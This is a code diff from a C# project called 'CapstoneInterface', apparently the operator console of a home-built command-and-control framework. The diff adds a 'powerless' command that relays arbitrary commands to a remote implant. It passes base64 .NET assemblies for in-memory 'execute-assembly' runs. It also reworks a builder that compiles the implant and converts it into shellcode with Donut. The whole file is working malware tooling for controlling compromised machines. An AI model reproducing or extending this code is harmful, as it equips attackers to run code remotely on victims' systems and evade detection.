@@ -264,12 +264,40 @@ namespace CapstoneInterface
 
                     sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                 }
+                else if (input.Contains("powerless"))
+                {
+                    string[] result = input.Split(' ');
+
+                    // Assign the first part to a variable 'instruction'
+                    string instruction = result[0];
+
+                    // Join the remaining parts (if any) into a single string for 'args'
+                    string command = result.Length > 1 ? string.Join(" ", result.Skip(1)) : "";
+
+                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + command + " to '" + userToControl + "'";
+
+                    txtConsoleOutput.AppendText("\r\n\r\n");
+                    // Append the user command to the console output
+                    txtConsoleOutput.AppendText(userCommand + "\r\n");
+
+                    commandForImplant.Input = instruction;
+                    commandForImplant.ImplantUser = userToControl;
+                    commandForImplant.Args = "";
+                    commandForImplant.Operator = operatorName;
+                    commandForImplant.timeToExec = "0";
+                    commandForImplant.delay = "0";
+                    commandForImplant.command = command;
+
+                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
+
+                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
+                }
                 else if (input.Contains("execute-assembly"))
                 {
                     string[] result = input.Split(' ');
 
                     string instruction = result[0];
-                    string name = result[1];
+                    string assBase64 = result[1];
 
                     string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";
 
@@ -282,7 +310,7 @@ namespace CapstoneInterface
                     commandForImplant.Operator = operatorName;
                     commandForImplant.timeToExec = "0";
                     commandForImplant.delay = "0";
-                    commandForImplant.File = name;
+                    commandForImplant.File = assBase64;
 
                     dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
 
@@ -868,7 +896,7 @@ Invoke-Run
                 WriteFileContents(implantFilePath, modifiedImplantContents, "Write modified Implant.cs");
 
                 // Compilation and conversion process for both Implant and Loader
-                ExecuteCompilationAndConversion(basedirWin, implantFilePath, "Compilation and conversion for Implant");
+                ExecuteCompilationAndConversion(basedirWin, "Compilation and conversion for Implant");
 
                 // Revert the changes to maintain original state
                 WriteFileContents(implantFilePath, originalImplantContents, "Revert Implant.cs changes");
@@ -903,23 +931,23 @@ Invoke-Run
             }
         }
 
-        private void ExecuteCompilationAndConversion(string basedirWin, string implantFilePath, string operation)
+        private void ExecuteCompilationAndConversion(string basedirWin, string operation)
         {
             try
             {
-                string cscPath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
+                string cscPath = @"dotnet";
+                string csProjImplant = @"C:\Users\vquer\Documents\Capstone\Implementation\NewImplant\NewImplant.csproj";
                 string donutPath = Path.Combine(basedirWin, "donut\\donut.exe");
-                string implantExePath = Path.Combine(basedirWin, "donut\\Implant.exe");
-                string modulesPath = Path.Combine(basedirWin, "NewImplant\\Modules\\*.cs");
+                string implantExePath = Path.Combine(basedirWin, "donut\\");
                 string outputShellcodePath = Path.Combine(basedirWin, "Encryption\\implant.bin");
 
                 // Compile the C# code
-                string compileCommand = $"/unsafe /out:\"{implantExePath}\" \"{implantFilePath}\" \"{modulesPath}\"";
+                string compileCommand = $"build {csProjImplant} -c Release -o \"{implantExePath}\"";
 
                 // Convert the compiled executable to shellcode using Donut
-                string convertCommand = $"-a 2 --input:\"{implantExePath}\" --output:\"{outputShellcodePath}\"";
-                /*txtPayloadGen.AppendText($"{compileCommand}\n\n" + Environment.NewLine);
-                txtPayloadGen.AppendText($"{convertCommand}\n\n" + Environment.NewLine);*/
+                string convertCommand = $"-a 2 --input:\"{implantExePath}NewImplant.exe\" --output:\"{outputShellcodePath}\"";
+                txtPayloadGen.AppendText($"{compileCommand}\n\n" + Environment.NewLine);
+                txtPayloadGen.AppendText($"{convertCommand}\n\n" + Environment.NewLine);
 
                 ExecuteCommand(cscPath, compileCommand);
                 ExecuteCommand(donutPath, convertCommand);
@@ -940,7 +968,7 @@ Invoke-Run
                 process.StartInfo.UseShellExecute = false;
                 process.StartInfo.RedirectStandardOutput = true;
                 process.StartInfo.RedirectStandardError = true;
-
+                Console.WriteLine($"Executing {fileName} {arguments}\n\n\n");
                 try
                 {
                     process.Start();
@@ -950,18 +978,18 @@ Invoke-Run
                     string error = process.StandardError.ReadToEnd();
 
                     // Append both standard output and error to the text box
-                    //txtPayloadGen.AppendText($"Command Output: {output}\n" + Environment.NewLine);
+                    txtPayloadGen.AppendText($"Command Output: {output}\n" + Environment.NewLine);
                     if (!string.IsNullOrEmpty(error))
                     { 
-                        /*txtPayloadGen.AppendText($"An error occurred: {error}\n" + Environment.NewLine);*/
+                        txtPayloadGen.AppendText($"An error occurred: {error}\n" + Environment.NewLine);
                     }
 
                     // Append command details for reference
-                    /*txtPayloadGen.AppendText($"Executed Filename: {fileName}\n" + Environment.NewLine);*/
+                    txtPayloadGen.AppendText($"Executed Filename: {fileName}\n" + Environment.NewLine);
                 }
-                catch (Exception)
+                catch (Exception ex)
                 {
-                    /*txtPayloadGen.AppendText($"An exception occurred while executing the command: {ex.Message}\n" + Environment.NewLine);*/
+                    txtPayloadGen.AppendText($"An exception occurred while executing the command: {ex.Message}\n" + Environment.NewLine);
                 }
             }
         }
